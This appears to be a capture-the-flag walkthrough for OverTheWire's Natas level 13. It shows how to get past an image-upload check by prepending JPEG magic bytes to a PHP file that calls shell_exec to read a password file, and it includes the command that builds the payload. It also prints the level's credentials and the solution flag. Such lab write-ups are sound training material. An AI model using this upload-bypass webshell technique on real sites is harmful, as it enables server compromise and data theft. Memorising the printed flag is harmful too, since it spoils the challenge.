# Natas Level 13

Access data:

    username: natas13
    password: lW3jYRI02ZKDBb8VtQBU1f6eDRo6WEj9

Connect to the service using basic HTTP auth by replacing the credentials in the link:
    
    http://*USERNAME*:*FLAG*@*USERNAME*.natas.labs.overthewire.org/

This is a variation of the [previous challenge](/OverTheWire.org/NATAS/Natas12/README.md).

The file extension is still controlable but know the webserver tries to verify whether an image file was uploaded or not. Playing around you can find out, that the file extension does not influence the server detection behaviour. Maybe it is checking the [magic bytes](https://gist.github.com/leommoore/f9e57ba2aa4bf197ebc5) of the file?

Let's try it out. Create a php file like before:

```php 
    <?php
      $result = shell_exec("cat /etc/natas_webpass/natas14");
      print($result);
    ?>
```

But now prepend [magic bytes from a JPG file](https://gist.github.com/leommoore/f9e57ba2aa4bf197ebc5) (they are: FF D8 FF E0). 

You can do this using a command like this:

```bash
    printf "\xff\xd8\xff\xe0" | cat - natas13.php > payload.php
```

Switch filename in the form again from .jpg to .php and upload _payload.php_ and you should get to your flag!


<details>
  <summary>Solution</summary>
  Flag: qPazSJBmrmU7UQJv17MHk1PGC4DxZMEP
</details>